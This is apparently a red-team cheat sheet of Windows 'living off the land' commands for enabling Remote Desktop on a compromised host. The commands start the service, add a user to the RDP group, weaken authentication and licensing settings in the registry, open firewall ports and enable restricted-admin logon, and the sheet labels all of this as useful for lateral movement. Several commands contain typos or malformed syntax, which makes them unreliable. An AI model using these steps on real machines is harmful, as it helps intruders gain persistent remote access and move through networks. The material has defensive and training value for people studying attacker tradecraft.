# Living off the Land

## 01 - Enable RDP Server

`C:\> sc config termservice start=auto`

To start Remote Desktop Service

`C:\> net start termservice`

To stop Remote Desktop Service

`C:\> net stop termservice`

## 02 - Enable with Registry

### 2.1 - Choose any of the three options

#### 2.1.1 - Automatic

```
C:\> reg add hklm\system\currentcontrolset\services\termservice /v Start /t REG_DWORD /d 2 /f

PS C:\> Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\Termservice" -Name "Start" -PropertyType string DWord -Value 2
```

#### 2.1.2 - Manual

```
C:\> reg add hklm\system\currentcontrolset\services\termservice /v Start /t REG_DWORD /d 3 /f

PS C:\> Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\Termservice" -Name "Start" -PropertyType string DWord -Value 3
```

#### 2.1.3 - Disabled

```
C:\> reg add hklm\system\currentcontrolset\services\termservice /v Start /t REG_DWORD /d 4 /f

PS C:\> Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\Termservice" -Name "Start" -PropertyType string DWord -Value 4
```

### 2.2 - Create user and add it to the RDP users group

^1f2bd0

`C:\> net user <username> <password> /add & net localgroup "Remote Desktop Users" <username> /add`

`PS C:\> Add-LocalGroupMember -Group "Remote Desktop Users" -Member <username>`

### 2.3 - Ports for the RDP port

#### 2.3.1 - Command Prompt

```
C:\> reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 3389:TCP /t REG_SZ /d "3389:TCP:*:Enabled:Remote Desktop" /f

C:\> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

C:\> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

C:\> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f

C:\> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f
```

#### 2.3.2 - Powershell

```
PS C:\> Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "PortNumber" -Value <PORT>

PS C:\> Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
```

### 2.4 - Set a firewall rule

#### 2.4.1 - Command Prompt

```
C:\> netsh firewall set service type=remotedesktop mode=enabled

C:\> netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

#### 2.4.2 - Powershell

```
PS C:\> Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

PS C:\> New-NetFirewallRule -DisplayName 'RDPPORTLatest' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 21390
```

### 2.5 - Disable Admin Restriction

`C:\> reg add "HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestricedAdmin /t REG_DWORD /d 0 /f`

### 2.6 - Login RDP

- Useful for lateral movement

`C:\> mstsv /v:<IP> [/restrictedadmin]`

---
## References

- [TakeMyRDP2.0](https://github.com/nocerainfosec/TakeMyRDP2.0)